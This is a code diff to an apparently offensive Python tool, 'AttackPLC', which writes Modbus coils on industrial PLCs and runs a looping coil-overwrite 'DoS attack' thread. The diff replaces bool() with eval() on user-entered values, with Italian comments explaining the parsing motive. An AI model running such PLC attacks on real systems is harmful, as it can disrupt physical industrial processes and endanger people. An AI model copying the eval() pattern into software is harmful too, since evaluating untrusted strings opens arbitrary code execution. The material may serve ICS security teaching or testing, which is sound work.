@@ -430,7 +430,10 @@ class AttackPLC:
                 value = value.split(',')
 
                 for coil_val in value:
-                    values.append(bool(coil_val))
+                    # Uso eval() al posto di bool() perchè altrimenti non mi viene fatto il casting corretto
+                    # della stringa (bool() converte a False solo la stringa vuota!). Invece eval() valuta correttamente
+                    # False, 0, f et similia...
+                    values.append(eval(coil_val))
 
         elif choice[2] == "W" or choice[2] == "w":
             reg_type = "register"
@@ -489,11 +492,14 @@ class AttackPLC:
             else:
                 print(f"{self.bcolors.BOLD}DoS attack{self.bcolors.ENDC} from "
                       f"{self.bcolors.OKRED}%QX{addr}.{register}{self.bcolors.ENDC} "
-                      f"to {self.bcolors.OKRED}%QX{addr}.{register + len(value)}{self.bcolors.ENDC}")
+                      f"to {self.bcolors.OKRED}%QX{addr}.{register + (len(value) - 1)}{self.bcolors.ENDC}")
 
             while True:
                 if not multi == 'multi':
-                    mb.write_single_coil(int(modbus_addr), bool(value))
+                    # Uso eval() al posto di bool() perchè altrimenti non mi viene fatto il casting corretto
+                    # della stringa (bool() converte a False solo la stringa vuota!). Invece eval() valuta correttamente
+                    # False, 0, f et similia...
+                    mb.write_single_coil(int(modbus_addr), eval(value))
                 else:
                     mb.write_multiple_coils(int(modbus_addr), value)
 
@@ -532,7 +538,7 @@ class AttackPLC:
             # con l'attacco, altrimenti fai una normale scrittura singola
             if loop == "Y" or loop == "y":
                 if not multi == 'multi':
-                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'single', int(modbus_addr), bool(value)))
+                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'single', int(modbus_addr), value))
                 else:
                     thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'multi', int(modbus_addr), value))
 
@@ -556,7 +562,11 @@ class AttackPLC:
                 if not multi == 'multi':
                     print(f'Attacking {self.bcolors.BOLD}single{self.bcolors.ENDC} coil '
                           f'{self.bcolors.OKRED}%QX{int(octal_addr)}.{int(octal_coil)}{self.bcolors.ENDC}')
-                    mb.write_single_coil(modbus_addr, bool(value))
+
+                    # Uso eval() al posto di bool() perchè altrimenti non mi viene fatto il casting corretto
+                    # della stringa (bool() converte a False solo la stringa vuota!). Invece eval() valuta correttamente
+                    # False, 0, f et similia...
+                    mb.write_single_coil(modbus_addr, eval(value))
                 else:
                     print(f'Attacking {self.bcolors.BOLD}multiple{self.bcolors.ENDC} coils '
                           f'from {self.bcolors.OKRED}%QX{int(octal_addr)}.{int(octal_coil)}{self.bcolors.ENDC} '
